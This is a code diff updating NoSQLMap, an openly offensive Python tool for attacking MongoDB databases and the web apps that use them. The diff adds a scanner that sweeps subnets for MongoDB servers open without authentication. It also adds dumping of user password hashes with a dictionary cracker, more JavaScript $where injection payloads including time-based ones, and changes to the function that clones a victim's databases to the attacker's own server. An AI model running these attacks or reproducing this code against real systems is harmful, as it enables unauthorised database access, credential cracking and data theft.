@@ -23,10 +23,20 @@ import httplib2
 import urllib
 import pymongo
 import subprocess
+import json
+import gridfs
+import ipcalc
+from hashlib import md5
 
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
 global optionSet
 optionSet = [False,False,False,False,False,False]
+global victim
+global webPort
+global uri
+global httpMethod
+global myIP
+global myPort
 
 
 def mainMenu():
@@ -34,15 +44,16 @@ def mainMenu():
 	while select:
 		os.system('clear')
 		#label = subprocess.check_output(["git","describe","--always"])
-		print "NoSQLMap-v0.15b"
+		print "NoSQLMap-v0.2"
 		print "nosqlmap@gmail.com"
 		print "\n"
-		print "1-Set options (do this first)"
+		print "1-Set options"
 		print "2-NoSQL DB Access Attacks"
 		print "3-NoSQL Web App attacks"
-		print "4-Exit"
+		print "4-Scan for Anonymous MongoDB Access"
+		print "x-Exit"
 
-		select = raw_input("Select an option:")
+		select = raw_input("Select an option: ")
 
 		if select == "1":
 			options()
@@ -65,8 +76,11 @@ def mainMenu():
 			else:
 				raw_input("Options not set! Check Host and URI path.  Press enter to continue...")
 				mainMenu()
-
+				
 		elif select == "4":
+			massMongo()
+
+		elif select == "x":
 			sys.exit()
 			
 		else:
@@ -75,26 +89,26 @@ def mainMenu():
 			
 
 def options():
-	global victim
-	global webPort
-	global uri
-	global httpMethod
-	global myIP
-	global myPort
 	
 	#Set default value if needed
 	if optionSet[0] == False:
+		global victim
 		victim = "Not Set"
 	if optionSet[1] == False:
+		global webPort
 		webPort = 80
 		optionSet[1] = True
 	if optionSet[2] == False:
+		global uri
 		uri = "Not Set"
 	if optionSet[3] == False:
+		global httpMethod
 		httpMethod = "GET"
 	if optionSet[4] == False:
+		global myIP
 		myIP = "Not Set"
 	if optionSet[5] == False:
+		global myPort
 		myPort = "Not Set"
 	
 	select = True
@@ -109,8 +123,9 @@ def options():
 		print "5-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
 		print "6-Set shell listener port (Current: " + str(myPort) + ")"
 		print "7-Load options file"
-		print "8-Save options file"
-		print "9-Back to main menu"
+		print "8-Load options from saved Burp request"
+		print "9-Save options file"
+		print "x-Back to main menu"
 
 		select = raw_input("Select an option: ")
 		
@@ -188,8 +203,35 @@ def options():
 			except:
 				print "Couldn't load options file!"
 			options()
-			
+		
 		elif select == "8":
+			loadPath = raw_input("Enter path to Burp request file: ")
+
+			try:
+				fo = open(loadPath,"r")
+				reqData = fo.readlines()
+				
+			except:
+				raw_input("error reading file.  Press enter to continue...")
+				mainMenu()
+
+			methodPath = reqData[0].split(" ")
+
+			if methodPath[0] == "GET":
+				httpMethod = "GET"
+			
+			elif methodPath[0] == "POST":
+				httpMethod = "POST"
+				postData = reqData[len(reqData)-1]
+			else:
+				print "unsupported method in request header."
+			
+			victim = reqData[1].split( " ")[1].replace("\r\n","")
+			optionSet[0] = True
+			uri = methodPath[1].replace("\r\n","")
+			optionSet[2] = True			
+			
+		elif select == "9":
 			savePath = raw_input("Enter file name to save: ")
 			try:
 				fo = open(savePath, "wb")
@@ -198,10 +240,13 @@ def options():
 				print "Options file saved!"
 			except:
 				print "Couldn't save options file."
-		elif select == "9":
-			mainMenu()
 
+		elif select == "x":
+			mainMenu()
+			
 def netAttacks(target):
+	print "DB Access attacks"
+	print "================="
 	mgtOpen = False
 	webOpen = False
 	#This is a global for future use with other modules; may change
@@ -217,10 +262,7 @@ def netAttacks(target):
 			mgtOpen = True
 	
 		except:
-			print "MongoDB port closed."
-		
-		
-	
+			print "MongoDB port closed."					
 	
 	elif srvNeedCreds == "y" or srvNeedCreds == "Y":
 		srvUser = raw_input("Enter server username: ")
@@ -243,17 +285,41 @@ def netAttacks(target):
 		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
 		if mgtRespCode == 200:
 			print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
+			testRest = raw_input("Start tests for REST Interface? ")
+
+		if testRest == "y" or testRest == "Y":
+			restUrl = mgtUrl + "/listDatabases?text=1"
+			restResp = urllib.urlopen(restUrl).read()
+			restOn = restResp.find('REST is not enabled.')
+
+			if restOn == -1:
+				print "REST interface enabled!"
+				dbs = json.loads(restResp)
+				menuItem = 1
+				print "List of databases from REST API:"
+
+				for x in range(0,len(dbs['databases'])):
+					dbTemp= dbs['databases'][x]['name']
+					print str(menuItem) + "-" + dbTemp
+					menuItem += 1
+			print "\n"
+
+		else:
+			print "REST interface not enabled." 
 			
 	except:
 		
-		print "MongoDB web management closed or requires authentication."
+		print "MongoDB web management closed or requires authentication."	
 		
+	print "\n"
 	if mgtOpen == True:
-		#Ths is compiling server info?????
 		print "Server Info:"
-		serverInfo = conn.server_info()
-		print serverInfo
-
+		mongoVer = conn.server_info()['version']
+		print "MongoDB Version: " + mongoVer
+		mongoDebug = conn.server_info()['debug']
+		print "Debugs enabled : " + str(mongoDebug)
+		mongoPlatform = conn.server_info()['bits']
+		print "Platform: " + str(mongoPlatform) + " bit"
 		print "\n"
 		
 		try:
@@ -274,22 +340,48 @@ def netAttacks(target):
 				colls = db.collection_names()
 				print dbItem + ":"
 				print "\n".join(colls)
+				print "\n"
+				
 				if 'system.users' in colls:
 					users = list(db.system.users.find())
 					print "Database Users and Password Hashes:"
-					#print dbItem
-					print str(users)
-			#print "\n"
-		
+					
+					for x in range (0,len(users)):
+						print "Username: " + users[x]['user']
+						print "Hash: " + users[x]['pwd']
+						print "\n"
+						crack = raw_input("Crack this hash? ")
+						
+						if crack == "y":
+							brute_pass(users[x]['user'],users[x]['pwd'])
+					
 		except:
 			print "Error:  Couldn't list collections.  The provided credentials may not have rights."
-			
+		
+		print "\n"
+		#Start GridFS enumeration
+		
+		testGrid = raw_input("Check for GridFS? ")
+		
+		if testGrid == "y" or testGrid == "Y":
+			for dbItem in dbList:
+				try:
+					db = conn[dbItem]
+					fs = gridfs.GridFS(db)
+					files = fs.list()
+					print "GridFS enabled on database " + str(dbItem)
+					print " list of files:"
+					print "\n".join(files)
+					
+				except:
+					print "GridFS not enabled on " + str(dbItem) + "."
+							
 		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
 		
 		if stealDB == "y" or stealDB == "Y":
 			stealDBs (myIP)
 			
-		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
+		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)? ")
 		
 		if getShell == "y" or getShell == "Y":
 			#Launch Metasploit exploit
@@ -304,10 +396,14 @@ def netAttacks(target):
 	
 	
 def webApps():
+	print "Web App Attacks"
+	print "==============="
 	paramName = []
 	paramValue = []
 	vulnAddrs = []
 	possAddrs = []
+	timeVulnsStr = []
+	timeVulnsInt = []
 	appUp = False
 	strTbAttack = False
 	intTbAttack = False
@@ -358,167 +454,167 @@ def webApps():
 		else:
 			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter value!\n"
 			
-		print "Testing Mongo PHP not equals associative array injection using " + neqUri +"..."
-		injLen = int(len(urllib.urlopen(neqUri).read()))
+		print "Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"..."
+		injLen = int(len(urllib.urlopen(uriArray[1]).read()))
 		print "Got response length of " + str(injLen) + "."
 		
 		randInjDelta = abs(injLen - randLength)
 		
 		if (randInjDelta >= 100) and (injLen != 0) :
 			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
-			vulnAddrs.append(neqUri)
+			vulnAddrs.append(uriArray[1])
 		
 		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
 			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
-			possAddrs.append(neqUri)
+			possAddrs.append(uriArray[1])
 		
 		elif (randInjDelta == 0):
 			print "Random string response size and not equals injection were the same. Injection did not work."
 		else:
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-			possAddrs.append(neqUri)
+			possAddrs.append(uriArray[1])
 		
 		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
-		print "Injecting " + whereStrUri
+		print "Injecting " + uriArray[2]
 		
-		whereStrLen = int(len(urllib.urlopen(whereStrUri).read()))
+		whereStrLen = int(len(urllib.urlopen(uriArray[2]).read()))
 		whereStrDelta = abs(whereStrLen - randLength)
 		
 		if (whereStrDelta >= 100) and (whereStrLen > 0):
 			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
-			vulnAddrs.append(whereStrUri)
+			vulnAddrs.append(uriArray[2])
 		
 		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
 			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			possAddrs.append(whereStrUri)
+			possAddrs.append(uriArray[2])
 			
 		elif (whereStrDelta == 0):
 			print "Random string response size and $where injection were the same. Injection did not work."
 		
 		else:
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-			possAddrs.append(whereStrUri)
+			possAddrs.append(uriArray[2])
 		
 		print "\n"
 		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
-		print "Injecting " + whereIntUri
+		print "Injecting " + uriArray[3]
 		
-		whereIntLen = int(len(urllib.urlopen(whereIntUri).read()))
+		whereIntLen = int(len(urllib.urlopen(uriArray[3]).read()))
 		whereIntDelta = abs(whereIntLen - randLength)
 		
 		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
 			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
-			vulnAddrs.append(whereIntUri)
+			vulnAddrs.append(uriArray[3])
 			
 		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
 			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			possAddrs.append(whereIntUri)
+			possAddrs.append(uriArray[3])
 			
 		elif (whereIntDelta == 0):
 			print "Random string response size and $where injection were the same. Injection did not work."
 		
 		else:
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-			possAddrs.append(whereIntUri)
+			possAddrs.append(uriArray[3])
 			
 		#Start a single record attack in case the app expects only one record back
 		
 		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
-		print " Injecting " + whereOneStr
+		print " Injecting " + uriArray[4]
 		
 		
-		whereOneStrLen = int(len(urllib.urlopen(whereOneStr).read()))
+		whereOneStrLen = int(len(urllib.urlopen(uriArray[4]).read()))
 		whereOneStrDelta = abs(whereOneStrLen - randLength)
 			
 		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
 			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
-			vulnAddrs.append(whereOneStr)
+			vulnAddrs.append(uriArray[4])
 		
 		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
 			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			possAddrs.append(whereOneStr)
+			possAddrs.append(uriArray[4])
 			
 		elif (whereOneStrDelta == 0):
 			print "Random string response size and $where single injection were the same. Injection did not work."
 		
 		else:
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-			possAddrs.append(whereOneStr)
+			possAddrs.append(uriArray[4])
 			
 		print "\n"
 		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
-		print " Injecting " + whereOneInt
+		print " Injecting " + uriArray[5]
 		
 		
-		whereOneIntLen = int(len(urllib.urlopen(whereOneInt).read()))
+		whereOneIntLen = int(len(urllib.urlopen(uriArray[5]).read()))
 		whereOneIntDelta = abs(whereOneIntLen - randLength)				
 			
 		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
 			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
-			vulnAddrs.append(whereOneInt)
+			vulnAddrs.append(uriArray[5])
 		
 		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
 			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			possAddrs.append(whereOneInt)
+			possAddrs.append(uriArray[5])
 			
 		elif (whereOneIntDelta == 0):
 			print "Random string response size and $where single record injection were the same. Injection did not work."
 			
 		else:	
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
-			possAddrs.append(whereOneInt)
+			possAddrs.append(uriArray[5])
 			
 		print "\n"
 		print "Testing Mongo this not equals string escape attack for all records..."
-		print " Injecting " + strThisNeqUri
+		print " Injecting " + uriArray[8]
 		
-		whereThisStrLen = int(len(urllib.urlopen(strThisNeqUri).read()))
+		whereThisStrLen = int(len(urllib.urlopen(uriArray[8]).read()))
 		whereThisStrDelta = abs(whereThisStrLen - randLength)
 		
 		if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
 			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
-			vulnAddrs.append(strThisNeqUri)
+			vulnAddrs.append(uriArray[8])
 		
 		elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
 			print " response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			possAddrs.append(strThisNeqUri)
+			possAddrs.append(uriArray[8])
 			
 		elif (whereThisStrDelta == 0):
 			print "Random string response size and this return response size were the same. Injection did not work."
 			
 		else:	
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
-			possAddrs.append(strThisNeqUri)
+			possAddrs.append(uriArray[8])
 			
 		print "\n"
 		print "Testing Mongo this not equals integer escape attack for all records..."
-		print " Injecting " + intThisNeqUri
+		print " Injecting " + uriArray[9]
 		
-		whereThisIntLen = int(len(urllib.urlopen(intThisNeqUri).read()))
+		whereThisIntLen = int(len(urllib.urlopen(uriArray[9]).read()))
 		whereThisIntDelta = abs(whereThisIntLen - randLength)
 		
 		if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
 			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
-			vulnAddrs.append(intThisNeqUri)
+			vulnAddrs.append(uriArray[9])
 		
 		elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
 			print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			possAddrs.append(intThisNeqUri)
+			possAddrs.append(uriArray[9])
 			
 		elif (whereThisIntDelta == 0):
 			print "Random string response size and this return response size were the same. Injection did not work."
 			
 		else:	
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
-			possAddrs.append(intThisNeqUri)
+			possAddrs.append(uriArray[9])
 			
-			
-		doTimeAttack = raw_input("Start timing based tests?")
+		print "\n"
+		doTimeAttack = raw_input("Start timing based tests? ")
 		
 		if doTimeAttack == "y" or doTimeAttack == "Y":
 			print "Starting Javascript string escape time based injection..."
 			start = time.time()
-			strTimeInj = urllib.urlopen(timeStrUri)
+			strTimeInj = urllib.urlopen(uriArray[6])
 			page = strTimeInj.read()
 			end = time.time()
 			strTimeInj.close()
@@ -536,7 +632,7 @@ def webApps():
 			
 			print "Starting Javascript integer escape time based injection..."
 			start = time.time()
-			intTimeInj = urllib.urlopen(timeIntUri)
+			intTimeInj = urllib.urlopen(uriArray[7])
 			page = intTimeInj.read()
 			end = time.time()
 			intTimeInj.close()
@@ -605,37 +701,37 @@ def randInjString(size):
 	print "2-Letters only"
 	print "3-Numbers only"
 	print "4-Email address"
-	format = raw_input("Select an option: ")
+	format = True
 	
-	if format == "1":
-		chars = string.ascii_letters + string.digits
-		return ''.join(random.choice(chars) for x in range(size))
+	while format:
+		format = raw_input("Select an option: ")
 	
-	elif format == "2":
-		chars = string.ascii_letters
-		return ''.join(random.choice(chars) for x in range(size))
+		if format == "1":
+			chars = string.ascii_letters + string.digits
+			return ''.join(random.choice(chars) for x in range(size))
 	
-	elif format == "3":
-		chars = string.digits
-		return ''.join(random.choice(chars) for x in range(size))
+		elif format == "2":
+			chars = string.ascii_letters
+			return ''.join(random.choice(chars) for x in range(size))
 	
-	elif format == "4":
-		chars = string.ascii_letters + string.digits
-		return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'
+		elif format == "3":
+			chars = string.digits
+			return ''.join(random.choice(chars) for x in range(size))
+	
+		elif format == "4":
+			chars = string.ascii_letters + string.digits
+			return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'
+		
+		else:
+			format = True
+			print "Invalid selection."
 	
 
 def buildUri(origUri, randValue):
 	paramName = []
 	paramValue = []
-	global neqUri
-	global whereStrUri
-	global whereIntUri
-	global whereOneStr
-	global whereOneInt
-	global timeStrUri
-	global timeIntUri
-	global strThisNeqUri
-	global intThisNeqUri
+	global uriArray
+	uriArray = ["","","","","","","","","","","","","",""]
 	injOpt = ""
 	
 	#Split the string between the path and parameters, and then split each parameter
@@ -667,61 +763,84 @@ def buildUri(origUri, randValue):
 	except:
 		raw_input("Something went wrong.  Press enter to return to the main menu...")
 		mainMenu()
-
-	evilUri = split_uri[0] + "?"
-	neqUri = split_uri[0] + "?"
-	whereStrUri = split_uri[0] + "?"
-	whereIntUri = split_uri[0] + "?"
-	whereOneStr = split_uri[0] + "?"
-	whereOneInt = split_uri[0] + "?"
-	timeStrUri = split_uri[0] + "?"
-	timeIntUri = split_uri[0] + "?"
-	strThisNeqUri = split_uri[0] + "?"
-	intThisNeqUri = split_uri[0] + "?"
+	
+	#print "debug:"
+	#print split_uri[0]
+	
 	x = 0
+	uriArray[0] = split_uri[0] + "?"
+	uriArray[1] = split_uri[0] + "?"
+	uriArray[2] = split_uri[0] + "?"
+	uriArray[3] = split_uri[0] + "?"
+	uriArray[4] = split_uri[0] + "?"
+	uriArray[5] = split_uri[0] + "?"
+	uriArray[6] = split_uri[0] + "?"
+	uriArray[7] = split_uri[0] + "?"
+	uriArray[8] = split_uri[0] + "?"
+	uriArray[9] = split_uri[0] + "?"
+	uriArray[10] = split_uri[0] + "?"
+	uriArray[11] = split_uri[0] + "?"
+	uriArray[12] = split_uri[0] + "?"
+	uriArray[13] = split_uri[0] + "?"
 	
 	for item in paramName:		
 		if paramName[x] == injOpt:
-			evilUri += paramName[x] + "=" + randValue + "&"
-			neqUri += paramName[x] + "[$ne]=" + randValue + "&"
-			whereStrUri += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
-			whereIntUri += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
-			whereOneStr += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
-			whereOneInt += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
-			timeStrUri  += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
-			timeIntUri  += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
-			strThisNeqUri += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
-			intThisNeqUri += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
+			uriArray[0] += paramName[x] + "=" + randValue + "&"
+			uriArray[1] += paramName[x] + "[$ne]=" + randValue + "&"
+			uriArray[2] += paramName[x] + "=a'; return db.a.find(); var dummy='!" + "&"
+			uriArray[3] += paramName[x] + "=1; return db.a.find(); var dummy=1" + "&"
+			uriArray[4] += paramName[x] + "=a'; return db.a.findOne(); var dummy='!" + "&"
+			uriArray[5] += paramName[x] + "=a; return db.a.findOne(); var dummy=1" + "&"
+			uriArray[6] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
+			uriArray[7] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
+			uriArray[8] += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
+			uriArray[9] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
+			uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy=\"!" + "&"
+			uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy=\"!" + "&"
+			uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
+			uriArray[13] += paramName[x] + "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
+			
 
 		else:
-			evilUri += paramName[x] + "=" + paramValue[x] + "&"
-			neqUri += paramName[x] + "=" + paramValue[x] + "&"
-			whereStrUri += paramName[x] + "=" + paramValue[x] + "&"
-			whereIntUri += paramName[x] + "=" + paramValue[x] + "&"
-			whereOneStr += paramName[x] + "=" + paramValue[x] + "&"
-			whereOneInt += paramName[x] + "=" + paramValue[x] + "&"
-			timeStrUri += paramName[x] + "=" + paramValue[x] + "&"
-			timeIntUri += paramName[x] + "=" + paramValue[x] + "&"
-			strThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
-			intThisNeqUri += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[1] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[2] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[3] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[4] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[5] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[6] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[7] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[8] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[9] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[10] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[11] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[12] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[13] += paramName[x] + "=" + paramValue[x] + "&"
+			
 		x += 1
 		
 	#Clip the extra & off the end of the URL
-	evilUri = evilUri[:-1]
-	neqUri = neqUri[:-1]
-	whereStrUri = whereStrUri[:-1]
-	whereIntUri = whereIntUri[:-1]
-	whereOneStr = whereOneStr[:-1]
-	whereOneInt = whereOneInt[:-1]
-	strThisNeqUri = strThisNeqUri[:-1]
-	intThisNeqUri = intThisNeqUri[:-1]
-	timeStrUri = timeStrUri[:-1]
-	timeIntUri = timeIntUri[:-1]
-	
-	return evilUri
+	uriArray[0]= uriArray[0][:-1]
+	uriArray[1] = uriArray[1][:-1]
+	uriArray[2] = uriArray[2][:-1]
+	uriArray[3] = uriArray[3][:-1]
+	uriArray[4] = uriArray[4][:-1]
+	uriArray[5] = uriArray[5][:-1]
+	uriArray[6] = uriArray[6][:-1]
+	uriArray[7] = uriArray[7][:-1]
+	uriArray[8] = uriArray[8][:-1]
+	uriArray[9] = uriArray[9][:-1]
+	uriArray[10] = uriArray[10][:-1]
+	uriArray[11] = uriArray[11][:-1]
+	uriArray[12] = uriArray[12][:-1]
+	uriArray[13] = uriArray[13][:-1]
+	return uriArray[0]
 
 def stealDBs(myDB):
-	menuItem = 1	
+	menuItem = 1
+	if optionSet[4] == False:
+		raw_input("No destination database set! Press enter to return to the main menu.")
+		mainMenu()
 	
 	for dbName in dbList:
 		print str(menuItem) + "-" + dbName
@@ -751,7 +870,7 @@ def stealDBs(myDB):
 			raw_input("Invalid Selection.  Press enter to continue.")
 			stealDBs(myDB)
 			
-		cloneAnother = raw_input("Database cloned.  Copy another?")
+		cloneAnother = raw_input("Database cloned.  Copy another? ")
 		
 		if cloneAnother == "y" or cloneAnother == "Y":
 			stealDBs(myDB)
@@ -760,7 +879,123 @@ def stealDBs(myDB):
 			return()
 	
 	except:
-		raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
-		mainMenu()								
+		if str(sys.exc_info()).find('text search not enabled') != 1:
+			raw_input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
+			mainMenu()
+		else:
+			raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
+			mainMenu()
 	
+def massMongo():
+	global victim
+	optCheck = True
+	loadCheck = False
+	success = []
+	ipList = []
+	print "\n"
+	print "MongoDB Default Access Scanner"
+	print "=============================="
+	print "1-Scan a subnet for default MongoDB access"
+	print "2-Loads IPs to scan from a file"
+	
+	while optCheck:
+		loadOpt = raw_input("Select a scan method: ")
+		
+	
+		if loadOpt == "1":
+			subnet = raw_input("Enter subnet to scan: ")
+		
+			try:
+				for ip in ipcalc.Network(subnet):
+					ipList.append(str(ip))
+				optCheck = False
+			except:
+				raw_input("Not a valid subnet.  Press enter to return to main menu.")
+				mainMenu()
+				
+	
+		#print "Debug:"
+		#print ipList
+	
+		if loadOpt == "2":
+			while loadCheck == False:
+				loadPath = raw_input("Enter file name with IP list to scan: ")
+
+				try:
+					with open (loadPath) as f:
+					        ipList = f.readlines()
+					loadCheck = True
+					optCheck = False
+				except:
+					print "Couldn't open file."
+			
+
+	print "\n"
+	for target in ipList:
+	        try:
+	                conn = pymongo.MongoClient(target,27017)
+			print "Connected to " + target
+			dbList = conn.database_names()
+			
+			print "Successful default access on " + target
+			target = target[:-1]
+			success.append(target)
+			conn.disconnect()
+
+		except:
+		        print "Failed to connect to or need credentials for " + target 
+
+	print "\n\n"
+	print "Discovered MongoDB Servers:"
+	
+	menuItem = 1
+	for server in success:
+		print str(menuItem) + "-" + server
+		menuItem += 1
+	
+	select = True
+	print "\n"
+	while select:
+		select = raw_input("Select a NoSQLMap target or press x to exit: ")
+	
+		if select == "x" or select == "X":
+			mainMenu()
+	
+		elif select.isdigit() == True:
+			victim = success[int(select) - 1]
+			optionSet[0] = True
+			raw_input("New target set! Press enter to return to the main menu.")
+			mainMenu()
+	
+		else:
+			raw_input("Invalid selection.")				
+	
+def gen_pass(user, passw):
+	return md5(user + ":mongo:" + str(passw)).hexdigest();
+
+
+def brute_pass(user,key):
+	loadCheck = False
+	
+	while loadCheck == False:
+		dictionary = raw_input("Enter path to password dictionary: ")
+		try:
+			with open (dictionary) as f:
+			       passList = f.readlines()
+			loadCheck = True
+		except:
+			print " Couldn't load file."
+	
+	
+	print "Running dictionary attack..."
+	for passGuess in passList:
+		temp = passGuess.split("\n")[0]
+		
+		if gen_pass(user, temp) == key:
+			print "\nFound - "+user+":"+passGuess
+			return passGuess
+			
+	print "Password not found for "+user
+	return ""
+
 mainMenu()
